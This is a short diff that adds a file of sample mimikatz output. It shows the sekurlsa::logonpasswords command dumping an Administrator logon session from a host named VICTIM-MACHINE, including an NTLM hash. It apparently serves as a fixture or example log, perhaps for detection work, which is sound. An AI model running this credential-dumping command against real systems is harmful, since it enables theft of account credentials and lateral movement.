@@ -1,0 +1,16 @@
+mimikatz 2.2.0 (x64) built on Jul  1 2021
+
+sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 123 (00000000:0000007b)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : VICTIM-MACHINE
+Logon Server      : VICTIM-MACHINE
+Logon Time        : 05/05/2025 09:20:33
+SID               : S-1-5-21-0000000000-0000000000-0000000000-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : VICTIM-MACHINE
+         * NTLM     : 3b2c5a1a18c11f3d20372e341c10f4f6
